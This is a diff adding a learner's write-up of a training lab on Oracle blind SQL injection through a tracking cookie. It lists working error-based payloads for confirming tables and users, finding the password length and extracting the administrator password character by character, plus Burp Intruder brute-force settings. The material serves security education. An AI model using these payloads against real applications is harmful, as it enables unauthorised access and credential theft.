@@ -1,0 +1,56 @@
+Lab #12 - Blind SQLi with conditional errors 
+
+Vulnerable parameter - Tracking cookie
+
+End Goals:
+- Output the administrator password
+- login as administrator
+
+Analysis:
+ ---------
+1.  Prove that the parameter is vulnerable
+    Test payload:
+        ' || (select '') ||'           --> 500
+        ' || (select '' from dual) ||' --> 200 
+        the change in syntax shows this lab is using an oracle database - it as well proves that the lab is vulnerable to SQLi
+
+2.  Confirm that the users table exists in the database
+    ' || (select '' from users) || '   --> 500
+    The error could be due to our query being vague and not specifying the number of rows. 
+    ' || (select '' from users where rownum=1) || '     --> 200
+    Since we get a 200 response it indicates that the users table exists
+
+3.  Confirm that the administrator user exists in the users database
+    ' || (select '' from users where username='administrator') || ' --> 200
+    Although this returns a 200 response, its not enought to indicate that a user named 'administrator' actually exists. This is due to how SQL processes queries. It first will run the FROM clause and then SELECT. So in our query what happens is that if admin does exist then it runs the select statement to select a blank string (200 response) - if it doesnt contain admin then the select statement isnt run at all (200 response)\
+
+    So in order to trigger a different response we can use CASE expression (similar to if/else):
+     
+     ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' --> 500
+     Translation--> when 1=1 then perfrom TO_CHAR (converts num to string). 1/0 will result in an error which will break the query and result with 500
+
+     ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' --> 200
+     Translation--> Since 1=0 is false it will trigger the ELSE portion of the cluase which is querying a blank string resulting with 200. We have now figured out a way to trigger the app with an error based on if something is true or false. 
+
+     ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' --> 500
+     Translation--> SQL will first run the FROM clause, if its true i.e administrator does exist in the table 'users' then it will trigger the SELECT statement resulting with 500. If the administrator does not exist in the users table then select will not run and return a 200. 
+     e.g: ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administratdfadsfaor') || ' --> 200
+     Its important to remember that we are leveraging a 500 response to show if our query is TRUE and 200 response to show if its FALSE. 
+
+4.  Determine the length of administrator password
+
+     ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>20) || ' --> 200
+     Since this returned a 200 we know that the password is not bigger than 20 characters
+
+5. Output the administrator password
+
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' --> 200
+    'a' is not the first character of the password
+
+    To use burp and enumerate the entire password: 
+    -send request to intruder
+    -set attack type to 'Cluster Bomb'
+    -add position for the first parameter in the substring method --> substring(password,§1§,1)
+    -add position for the alphanumeric characters you are searching for --> username='administrator')='§a§'--
+    -set first payload to 'Numbers', 1-20, step=1
+    -set second payload to 'Bruteforcer', max/min = 1
